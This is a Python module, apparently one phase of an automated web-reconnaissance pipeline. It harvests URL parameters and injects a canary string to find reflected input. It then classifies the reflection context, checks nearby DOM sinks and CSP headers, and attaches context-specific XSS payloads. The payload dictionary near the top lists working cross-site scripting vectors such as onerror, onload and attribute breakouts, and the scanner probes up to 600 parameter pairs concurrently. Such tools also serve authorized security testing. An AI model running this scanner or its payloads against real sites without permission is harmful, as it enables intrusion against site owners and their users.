import re, time, requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.context import Context

CANARY = "JSXr4y7731z"

# ── Payload classes by reflection context ────────────────────────────────────
PAYLOAD_CLASSES = {
    "js_exec":   [
        "alert(1)//",
        ";alert(1)//",
        "\nalert(1)//",
        "};alert(1)//",
    ],
    "js_string": [
        "'-alert(1)-'",
        '"-alert(1)-"',
        "`;alert(1)//",
        "\\'-alert(1)-\\'",
    ],
    "html_body": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<script>alert(1)</script>",
    ],
    "html_attr": [
        '" onmouseover=alert(1) x="',
        "' onmouseover=alert(1) x='",
        '" autofocus onfocus=alert(1) "',
        "\" onload=alert(1) \"",
    ],
    "json": [
        '":<img src=x onerror=alert(1)>"',
        '","x":"<svg onload=alert(1)>',
    ],
    "url_context": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "css_context": [
        "};alert(1)//",
        "expression(alert(1))",
    ],
    "unknown": [
        "<img src=x onerror=alert(1)>",
        '" onmouseover=alert(1) "',
    ],
}

# DOM sink patterns — if canary lands near these, it's almost certainly exploitable
DOM_SINKS = [
    r'(?:innerHTML|outerHTML|document\.write|insertAdjacentHTML)\s*[=+]',
    r'\.html\s*\(',         # jQuery .html()
    r'\.append\s*\(',       # jQuery .append() with untrusted content
    r'eval\s*\(',
    r'setTimeout\s*\([^,)]*' + re.escape(CANARY),
    r'setInterval\s*\([^,)]*' + re.escape(CANARY),
    r'(?:src|href|action)\s*=\s*["\']?' + re.escape(CANARY),
]

HIGH_VALUE = {
    'q', 'query', 'search', 'keyword', 'text', 'input', 'msg', 'message',
    'content', 'comment', 'description', 'title', 'subject', 'body', 'note',
    'redirect', 'redirect_uri', 'redirect_url', 'return', 'returnUrl', 'next',
    'continue', 'callback', 'url', 'goto', 'dest', 'destination', 'target',
    'ref', 'referer', 'referrer', 'back', 'forward', 'location', 'template',
    'view', 'page', 'layout', 'format', 'theme', 'style', 'debug', 'test',
    'preview', 'mode', 'dev', 'name', 'username', 'user', 'email', 'token',
    'error', 'msg', 'info', 'notice', 'alert', 'warn',
}


def detect_context(html: str, canary: str) -> str:
    """Determine where the canary landed in the response."""
    if canary not in html:
        return None

    idx         = html.find(canary)
    surrounding = html[max(0, idx - 300): idx + 300]

    # JS execution context
    if re.search(
        r'(?:eval|setTimeout|setInterval|Function)\s*\([^)]*' + re.escape(canary),
        surrounding,
    ):
        return "js_exec"

    # Inside a <script> block
    if re.search(
        r'<script[^>]*>[^<]*' + re.escape(canary), surrounding, re.DOTALL
    ):
        # Distinguish string vs bare
        if re.search(r'["\']' + re.escape(canary), surrounding):
            return "js_string"
        return "js_exec"

    # HTML attribute value
    if re.search(
        r'(?:href|src|action|data-[a-z]+|on[a-z]+|value)\s*=\s*["\'][^"\']*'
        + re.escape(canary),
        surrounding,
    ):
        return "html_attr"

    # Generic attribute
    if re.search(
        r'=\s*["\'][^"\']*' + re.escape(canary) + r'[^"\']*["\']', surrounding
    ):
        return "html_attr"

    # URL context (href / src without quotes)
    if re.search(r'(?:href|src|action)=["\']?' + re.escape(canary), surrounding):
        return "url_context"

    # Inside a CSS block
    if re.search(r'<style[^>]*>[^<]*' + re.escape(canary), surrounding, re.DOTALL):
        return "css_context"

    # JSON response
    if re.search(r'["\']' + re.escape(canary) + r'["\']', surrounding) and \
       html.strip().startswith(('{', '[')):
        return "json"

    # HTML body text
    if re.search(r'>[^<]*' + re.escape(canary) + r'[^<]*<', surrounding):
        return "html_body"

    return "unknown"


def detect_dom_sinks(html: str, canary: str) -> list:
    """Check if canary appears near dangerous DOM sinks."""
    if canary not in html:
        return []
    idx  = html.find(canary)
    zone = html[max(0, idx - 500): idx + 500]
    return [sink for sink in DOM_SINKS if re.search(sink, zone, re.IGNORECASE)]


def parse_csp(csp_header: str) -> dict:
    """Parse Content-Security-Policy into structured flags."""
    return {
        "raw":            csp_header,
        "missing":        csp_header == "",
        "unsafe_inline":  "unsafe-inline" in csp_header,
        "unsafe_eval":    "unsafe-eval" in csp_header,
        "wildcard":       bool(re.search(r'\*\.?[a-zA-Z]', csp_header)),
        "data_uri":       "data:" in csp_header,
        "nonce":          "nonce-" in csp_header,
        "strict_dynamic": "strict-dynamic" in csp_header,
        "report_only":    False,  # set externally if header is report-only
    }


def probe_param(url: str, param: str, timeout: int, ua: str) -> dict:
    """Inject canary into param and analyse the response."""
    parsed = urlparse(url)
    qs     = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [CANARY]
    probe_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    result = {
        "url":            url,
        "probe_url":      probe_url,
        "param":          param,
        "reflects":       False,
        "context":        None,
        "dom_sinks":      [],
        "csp":            "",
        "csp_missing":    False,
        "csp_unsafe_inline": False,
        "csp_unsafe_eval":   False,
        "csp_wildcard":      False,
        "csp_nonce":         False,
        "payloads":       [],
        "status":         None,
        "error":          None,
        "source":         "url_pool",
        "high_value_param": param.lower() in HIGH_VALUE,
    }
    try:
        r = requests.get(
            probe_url, timeout=timeout,
            headers={"User-Agent": ua, "Accept": "text/html,*/*;q=0.8"},
            allow_redirects=True,
        )
        result["status"] = r.status_code

        csp_hdr  = r.headers.get("Content-Security-Policy", "")
        csp_ro   = r.headers.get("Content-Security-Policy-Report-Only", "")
        active_csp = csp_hdr or csp_ro
        csp_info = parse_csp(active_csp)
        if csp_ro and not csp_hdr:
            csp_info["report_only"] = True

        result["csp"]             = active_csp
        result["csp_missing"]     = csp_info["missing"]
        result["csp_unsafe_inline"] = csp_info["unsafe_inline"]
        result["csp_unsafe_eval"]   = csp_info["unsafe_eval"]
        result["csp_wildcard"]      = csp_info["wildcard"]
        result["csp_nonce"]         = csp_info["nonce"]
        result["csp_info"]          = csp_info

        if r.status_code == 200 and CANARY in r.text:
            result["reflects"]  = True
            ctx_type = detect_context(r.text, CANARY)
            result["context"]   = ctx_type
            result["dom_sinks"] = detect_dom_sinks(r.text, CANARY)
            result["payloads"]  = PAYLOAD_CLASSES.get(ctx_type, PAYLOAD_CLASSES["unknown"])

    except requests.exceptions.Timeout:
        result["error"] = "timeout"
    except Exception as e:
        result["error"] = str(e)
    return result


def build_probe_list(ctx: Context) -> list:
    """Build deduplicated (url, param, source) probe pairs from all data sources."""
    probes, seen = [], set()
    base_url = getattr(ctx, "canonical_url", None) or ctx.target_url

    def add(url, param, source="url_pool"):
        k = f"{url}|{param}"
        if k not in seen:
            seen.add(k)
            probes.append((url, param, source))

    # 1. URL pool — parameters already in harvested URLs
    for url in ctx.url_pool:
        if "?" in url:
            for param in parse_qs(urlparse(url).query).keys():
                add(url, param, "url_pool")

    # 2. Robots live — HTML pages + inject JS params onto them
    for r in ctx.robots_live:
        if r.get("status") == 200 and "html" in r.get("content_type", ""):
            url = r.get("resolved_url") or r["url"]
            for param in parse_qs(urlparse(url).query).keys():
                add(url, param, "robots")
            for param in ctx.js_global_params:
                if param.lower() in HIGH_VALUE:
                    base_r = f"{url}?{param}=" if "?" not in url else url
                    add(base_r, param, "robots+js")

    # 3. JS-derived endpoints + params
    for endpoint, params in ctx.js_param_map.items():
        full = endpoint if endpoint.startswith("http") \
               else f"{base_url.rstrip('/')}{endpoint}"
        for param in params:
            add(f"{full}?{param}=x", param, "js_map")

    # 4. Hidden params discovered by x8/arjun
    for endpoint, params in ctx.hidden_params.items():
        full = endpoint if endpoint.startswith("http") \
               else f"{base_url.rstrip('/')}{endpoint}"
        for param in params:
            add(f"{full}?{param}=x", param, "x8")

    return probes


def run(ctx: Context, phase_num=7, total=9) -> Context:
    probes = build_probe_list(ctx)
    ctx.log(f"[probe] {len(probes)} (url, param) pairs to test")

    if not probes:
        ctx.phases_run.append("probe")
        ctx.log_phase_done(phase_num, total, "probe", "0 probe pairs — check urls/js_extract phases")
        return ctx

    # Cap + prioritise: high-value sources first
    cap = 600
    if len(probes) > cap:
        order = {"js_map": 0, "robots+js": 1, "x8": 2, "robots": 3, "url_pool": 4}
        probes.sort(key=lambda x: (order.get(x[2], 5),
                                   0 if x[1].lower() in HIGH_VALUE else 1))
        probes = probes[:cap]
        ctx.log(f"[probe] Capped to {cap} pairs (highest-priority first)")

    results, reflected, dom_hit = [], 0, 0
    workers = min(10, len(probes))

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {
            ex.submit(probe_param, u, p, ctx.timeout, ctx.user_agent): (u, p, s)
            for u, p, s in probes
        }
        done = 0
        for f in as_completed(futures):
            r           = f.result()
            u, p, s     = futures[f]
            r["source"] = s
            results.append(r)
            done += 1

            if r["reflects"]:
                reflected += 1
                dom_flag   = " [DOM-SINK]" if r.get("dom_sinks") else ""
                csp_lbl    = "no-csp" if r["csp_missing"] else \
                             ("unsafe-inline" if r["csp_unsafe_inline"] else "has-csp")
                ctx.log(
                    f"[probe] ★ REFLECTS  {p:<22} @ "
                    f"{r['url'][:52]}  "
                    f"[{r['context']}] [{csp_lbl}]{dom_flag}"
                )
                if r.get("dom_sinks"):
                    dom_hit += 1
            elif done % 50 == 0:
                ctx.log(f"[probe] {done}/{len(probes)} probed...")

    ctx.reflections = results
    ctx.write_json("reflections_raw.json", results)
    ctx.phases_run.append("probe")
    ctx.log_phase_done(
        phase_num, total, "probe",
        f"{reflected} reflections | {dom_hit} DOM-sink hits | {len(probes)} tested",
    )
    return ctx
